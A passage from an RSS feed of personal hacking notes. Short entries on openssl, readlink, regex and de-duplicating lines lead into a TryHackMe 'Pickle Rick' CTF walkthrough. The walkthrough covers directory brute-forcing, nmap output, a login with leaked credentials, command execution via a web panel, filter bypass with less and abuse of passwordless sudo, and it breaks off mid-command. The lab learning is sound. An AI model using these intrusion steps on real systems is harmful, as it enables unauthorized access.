&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; s_client -connect &lt;span class=&quot;va&quot;&gt;${SERVER}&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;${PORT}&lt;/span&gt; -showcerts&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Get certificate information:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-17&quot;&gt;&lt;a href=&quot;#cb1-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; x509 -in &lt;span class=&quot;va&quot;&gt;$CERT&lt;/span&gt; -text -noout&lt;/span&gt;
&lt;span id=&quot;cb1-18&quot;&gt;&lt;a href=&quot;#cb1-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-19&quot;&gt;&lt;a href=&quot;#cb1-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Calculate a SHA1 fingerprint:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-20&quot;&gt;&lt;a href=&quot;#cb1-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-21&quot;&gt;&lt;a href=&quot;#cb1-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; x509 -noout -in &lt;span class=&quot;va&quot;&gt;$CERT&lt;/span&gt; -fingerprint&lt;/span&gt;
&lt;span id=&quot;cb1-22&quot;&gt;&lt;a href=&quot;#cb1-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-23&quot;&gt;&lt;a href=&quot;#cb1-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Calculate a MD5 fingerprint:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-24&quot;&gt;&lt;a href=&quot;#cb1-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-25&quot;&gt;&lt;a href=&quot;#cb1-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; x509 -noout -in &lt;span class=&quot;va&quot;&gt;$CERT&lt;/span&gt; -fingerprint -md5&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://serverfault.com/a/131628&quot;&gt;How to inspect remote SMTP server's TLS certificate?&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.sslshopper.com/certificate-decoder.html&quot;&gt;SSL Shopper Certificate Decoder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 03:55:00 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Pull%20SSL%20Certificates%20from%20an%20External%20Server.md</guid>
		</item>
		<item>
			<title>Quickly Find the Canonical Path of a File</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Quickly%20Find%20the%20Canonical%20Path%20of%20a%20File.md</link>
			<description>&lt;p&gt;On Debian-based systems and derivatives, use &lt;code&gt;readlink&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Some useful options from the man page:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;&lt;code&gt;-f&lt;/code&gt;, &lt;code&gt;--canonicalize&lt;/code&gt; canonicalize by following every symlink in every component of the given name recursively; all but the last component must exist&lt;/p&gt;&lt;p&gt;&lt;code&gt;-e&lt;/code&gt;, &lt;code&gt;--canonicalize-existing&lt;/code&gt; canonicalize by following every symlink in every component of the given name recursively, all components must exist&lt;/p&gt;&lt;p&gt;&lt;code&gt;-m&lt;/code&gt;, &lt;code&gt;--canonicalize-missing&lt;/code&gt; canonicalize by following every symlink in every component of the given name recursively, without requirements on components existence&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Note that this follows symlinks, so it's not suitable for every use.&lt;/p&gt;</description>
			<pubDate>Thu, 13 Apr 2023 03:55:00 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Quickly%20Find%20the%20Canonical%20Path%20of%20a%20File.md</guid>
		</item>
		<item>
			<title>Regex Metacharacters</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Regex%20Metacharacters.md</link>
			<description>&lt;h2 id=&quot;important-metacharacters&quot;&gt;Important âMetacharactersâ&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;\d&lt;/code&gt; â &lt;code&gt;[0-9]&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;\D&lt;/code&gt; â &lt;code&gt;[^0-9]&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;\w&lt;/code&gt; â &lt;code&gt;[0-9a-zA-Z_]&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;\W&lt;/code&gt; â &lt;code&gt;[^0-9a-zA-Z_]&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;\s&lt;/code&gt; â Whitespace characters (including line breaks)&lt;/li&gt;&lt;li&gt;&lt;code&gt;\S&lt;/code&gt; â Non-whitespace characters&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Be aware that &lt;code&gt;\w&lt;/code&gt; &lt;em&gt;includes&lt;/em&gt; &lt;code&gt;_&lt;/code&gt; (but not &lt;code&gt;-&lt;/code&gt;)!&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/catregex&quot;&gt;TryHackMe: Regular Expressions&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 03:55:00 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Regex%20Metacharacters.md</guid>
		</item>
		<item>
			<title>Removing Duplicate Lines in Bash</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Removing%20Duplicate%20Lines%20in%20Bash.md</link>
			<description>&lt;h2 id=&quot;quick-and-dirty&quot;&gt;Quick-and-Dirty&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; -u&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This works in a pinch, but as a side effect will sort the lines lexicographicly.&lt;/p&gt;&lt;h2 id=&quot;remove-all-but-the-first-occurrence-of-a-line&quot;&gt;Remove All But the First Occurrence of a Line&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; -n &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; -uk2 &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; -nk1 &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;cut&lt;/span&gt; -f2-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;remove-all-but-the-last-occurrence-of-a-line&quot;&gt;Remove All But the Last Occurrence of a Line&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; -n &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; -rk2 &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; -uk2 &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; -nk1 &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;cut&lt;/span&gt; -f2-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/a/20639730&quot;&gt;Remove duplicate lines without sorting&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 03:55:00 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Removing%20Duplicate%20Lines%20in%20Bash.md</guid>
		</item>
		<item>
			<title>Pickle Rick</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Pickle%20Rick.md</link>
			<description>&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;&lt;p&gt;This is a Rick &amp;amp; Morty themed web server / CTF. The fact that I've never watched the show may put me at a disadvantage.&lt;/p&gt;&lt;p&gt;There are three flags (&quot;ingredients Rick needs for a potion to transform themself from a pickle back into a human&quot;). Because of how TryHackMe masks answers, we already know the basic form of these strings (&lt;code&gt;*&lt;/code&gt; characters are unknown, but &lt;code&gt; &lt;/code&gt; and &lt;code&gt;.&lt;/code&gt; characters are literals):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Flag 1: **. ******* ****
Flag 2: * ***** ****
Flag 3: ***** *****
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I'm guessing that flag 1 begins with either numbers or an abbreviation (&lt;code&gt;Mr.&lt;/code&gt;?). Flag 2 probably begins with &lt;code&gt;A&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Because this is web server exploitation, it's going to make sense to use Burp Suite. In order to make the experience a little more pleasant, I'm going to add a pattern of &lt;code&gt;10.10.158.139&lt;/code&gt; (the IP address of the TryHackMe server I'm using) to FoxyProxy and then set it to &quot;Use proxies based on their pre-defined patterns and priorities&quot;; that way, only the CTF website will get proxied to Burp Suite.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Rick_and_Morty&quot;&gt;Rick and Morty (Wikipedia)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;&lt;p&gt;The server is running Apache 2.4.18 on some version of Ubuntu. The provided web page is very simple:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;HELP MORTY!&lt;/p&gt;&lt;p&gt;Listen Mortyâ¦ I need your help, I've turned myself into a pickle again and this time I can't change back!&lt;/p&gt;&lt;p&gt;I need you to &lt;em&gt;BURRRP&lt;/em&gt;â¦ Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the &lt;em&gt;BURRRRRRRRP&lt;/em&gt;, password was! Help Morty, Help!&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;There is no obvious place to login, upload files, or otherwise interact with the web server. No hint event that this is anything beyond a relatively static site (both jQuery and Bootstrap libraries are included, but there's no hooks in the actual page.)&lt;/p&gt;&lt;p&gt;There's a comment in the HTML that Rick's username is &lt;code&gt;R1ckRul3s&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;We look for directories of interest using gobuster.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; dir &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; http://10.10.158.139 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Discovered directories:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;/assets (website assets + a handful of Rick &amp;amp; Morty image files)&lt;/li&gt;&lt;li&gt;/server-status (returns 403)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Also probing the machine using nmap.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;nmap&lt;/span&gt; -vv -A -oA pickle-rick -sS -p- 10.10.158.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sun Oct 10 14:17:34 2021 as: nmap -vv -A -oA pickle-rick -sS -p- 10.10.158.139
Nmap scan report for 10.10.158.139
Host is up, received echo-reply ttl 61 (0.16s latency).
Scanned at 2021-10-10 14:17:36 MDT for 862s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:39:9b:09:99:36:f3:bc:fe:7c:83:99:92:3b:a7:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNZgE8CuciddazUr3rzoeSLp5UUW7FSMH7iGPEnz6E0GioM0ctbDfUtlp2jEOcetG3lnKzzD1JMPBh98h7ImpMSdpOMHRliy58a5CaBDv7O2boOUYrw0BiL9xHjEoeewTuKqHrsOal+o2M/Cmiho6K0FcHBmmf0/COnaT824p6XK5z7PYLuwoMF2Ujimz2hIFCFRn3eID0nCiMXxOUVI0Gn+m1xSDdOIqO7n9btU0oknWQ/QHbEMwVi/Hdv5b7xoO/MqiEAKVmvmsA483n8+uqhjmVXeYr/r588dUod0M1EY56RLgeiSnFWZ5D1bGxknmd+wh64At8MG4jZyDEhuVZ
|   256 ab:aa:da:0b:5b:22:01:bc:75:54:91:e8:2a:b6:60:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP74j/YgHBTZzXewO7k01lKCsNhH0h+qZBH5pvKkwoLvkiwVrmFMphtT+cHsdV5KnijsoRQtMolZyblXdHbVoOQ=
|   256 7f:32:1f:37:2a:58:e7:d0:fb:91:a4:8c:12:8e:2e:d6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFz+Ck64qc+5h2JvTgz7WYaLU4z+yu79Ug8CaW2vgP/9
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/10%OT=22%CT=1%CU=34787%PV=Y%DS=4%DC=T%G=Y%TM=61634D
OS:BE%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%T
OS:S=8)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST
OS:11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=6
OS:8DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M
OS:506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.017 days (since Sun Oct 10 14:06:48 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   31.96 ms  10.13.0.1
2   ... 3
4   172.74 ms 10.10.158.139

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 10 14:31:58 2021 -- 1 IP address (1 host up) scanned in 864.62 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Try to get some more information by connecting with ssh.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;ssh&lt;/span&gt; -v -F /dev/null &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-o&lt;/span&gt; IdentityAgent=none R1ckRul3s@10.10.158.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looks like password authentication is turned off - only the &lt;code&gt;publickey&lt;/code&gt; method is available. So no brute forcing here - we need Rick's private SSH key.&lt;/p&gt;&lt;p&gt;No obvious Apache or SSH RCEs for this version in Exploit DBâ¦&lt;/p&gt;&lt;p&gt;At this point I'm basically stuck, so I decide to see if I can get a hint by (partially!) reading someone else's walk-through. Most of the initial recon in that walk-through (I only scanned down that far) aligns with what I've already done, but it mentions two tools I've not yeat heard of - dirb (which looks like gobuster but possibly more straight-forward) and nikto (which I know &lt;em&gt;of&lt;/em&gt; but not &lt;em&gt;about&lt;/em&gt;). So let's try those!&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dirb&lt;/span&gt; http://10.10.158.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The dirb command finds everything that gobuster did, as well as a robots.txt file. This file contains a single &quot;word&quot;: &lt;code&gt;Wubbalubbadubdub&lt;/code&gt;. That doesn't mean anything to me really (maybe it's something that Rick would say), but maybe there will be a password field that I could try it out inâ¦&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nikto&lt;/span&gt; -host 10.10.158.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nikto is a scanner for common web vulnerabilities. A couple of interesting things pop out from the scanning of the target system:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Despite the simple page, it looks like the server is running PHP. So if I can figure out how to upload something, I've got a good shot at popping a reverse shell.&lt;/li&gt;&lt;li&gt;There's a /login.php file. Now THAT looks interesting!&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://razrexe.medium.com/tryhackme-pickle-rick-ctf-walkthrough-9ed36eff17fe&quot;&gt;TryHackMe Pickle Rick CTF Walkthrough&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;flag-1&quot;&gt;Flag 1&lt;/h2&gt;&lt;p&gt;Let's check out /login.php. This looks like a pretty straight-forward login page. No special headers show up when intercepting the response in Burp Suite, and again no JavaScript outside of the standard jQuery and Bootstrap libraries is loaded.&lt;/p&gt;&lt;p&gt;Let's try R1ckRul3s:Wubbalubbadubdub for our username:password.&lt;/p&gt;&lt;p&gt;And, with a redirect to /portal.php, we're in!&lt;/p&gt;&lt;p&gt;Let's poke around here a bit.&lt;/p&gt;&lt;p&gt;All of the links on this page &lt;em&gt;except&lt;/em&gt; for the first one (&quot;Commands&quot;) go to /denied.php. That page again doesn't include anything interesting (jQuery, Bootstrap, blah blah blah).&lt;/p&gt;&lt;p&gt;So all we've got is the mysterious &quot;Command Panel&quot;. There is also an HTML comment in the source of /portal.php with what &lt;em&gt;looks&lt;/em&gt; like a base64-encoded string in it. But feeding this to &lt;code&gt;base64 -d&lt;/code&gt; just results in an &lt;code&gt;invalid input&lt;/code&gt; error.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let's turn back to &quot;Command Panel&quot; and see what that does. Typing in &lt;code&gt;ls&lt;/code&gt; reveals what looks like a listing of the website root directory! Two new files here:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;/Sup3rS3cretPickl3Ingred.txt&lt;/li&gt;&lt;li&gt;/clue.txt&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Viewing /Sup3rS3cretPickl3Ingred.txt revels the first flag:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;mr. meeseek hair
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;flag-2&quot;&gt;Flag 2&lt;/h2&gt;&lt;p&gt;Let's continue poking around. Before we go back to /portal.php, let's take a look at /clue.txt.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb10&quot;&gt;&lt;pre class=&quot;sourceCode /clue.txt&quot;&gt;&lt;code class=&quot;sourceCode default&quot;&gt;&lt;span id=&quot;cb10-1&quot;&gt;&lt;a href=&quot;#cb10-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Look around the file system for the other ingredient.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Well, thank you Captain Obvious.&lt;/p&gt;&lt;p&gt;Let's see what we can do with the &quot;Command Panel&quot;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cat Sup3rS3cretPickl3Ingred.txt&lt;/code&gt; reveals that cat is disabled.&lt;/li&gt;&lt;li&gt;&lt;code&gt;ls /&lt;/code&gt; reveals that we can list things outside of the webroot.&lt;/li&gt;&lt;li&gt;&lt;code&gt;ls /home&lt;/code&gt; reveals two users: rick and ubuntu (so trying to SSH in as R1ckRul3s wouldn't have worked anyway).&lt;/li&gt;&lt;li&gt;&lt;code&gt;ls -la /home/rick&lt;/code&gt; reveals a &lt;code&gt;second ingredients&lt;/code&gt; fileâ¦ But no .ssh directory! Damnit.&lt;/li&gt;&lt;li&gt;&lt;code&gt;ls -la /home/ubuntu&lt;/code&gt; does reveal an .ssh directory, but we can't actually descend into it.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Alright, so &lt;code&gt;cat&lt;/code&gt; is disabled. But can I get at it another way? &lt;code&gt;bash -c &quot;cat Sup3rS3cretPickl3Ingred.txt&quot;&lt;/code&gt; also doesn't work. Neither does &lt;code&gt;more Sup3rS3cretPickl3Ingred.txt&lt;/code&gt;. But &lt;code&gt;less Sup3rS3cretPickl3Ingred.txt&lt;/code&gt; does work!&lt;/p&gt;&lt;p&gt;Let's get that second flag by executing &lt;code&gt;less &quot;/home/rick/second ingredients&quot;&lt;/code&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;1 jerry tear
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;flag-3&quot;&gt;Flag 3&lt;/h2&gt;&lt;p&gt;Let's get us some filesystem access. On a lark, I tried the command &lt;code&gt;sudo whoami&lt;/code&gt;â¦ And the answer is &lt;code&gt;root&lt;/code&gt;! Jackpot!&lt;/p&gt;&lt;p&gt;Though &lt;code&gt;sudo less /etc/sudoers&lt;/code&gt; reveals that www-data has full sudo access without a password, so it's really just as good.&lt;/p&gt;&lt;p&gt;Andâ¦ &lt;code&gt;sudo ls -la /home/ubuntu/.ssh&lt;/code&gt; reveals no private SSH key.&lt;/p&gt;&lt;p&gt;Doing &lt;code&gt;less portal.php&lt;/code&gt; reveals that the mystery string is simply hard-coded, and nothing interesting is hidden in the other PHP files.&lt;/p&gt;&lt;p&gt;I'm not sure where the final flag is, but I have enough access now to pop a full root shell. Unfortunately, I can't seem to start nc through the &quot;Command Panel&quot;, so we'll just do this the noisy way.&lt;/p&gt;&lt;p&gt;First, on my local system create a new temporary SSH key pair using &lt;code&gt;ssh-keygen -f ~/id_rsa&lt;/code&gt;. Then, enter the following commands in the &quot;Command Panel&quot;:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb12&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb12-1&quot;&gt;&lt;a href=&quot;#cb12-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span 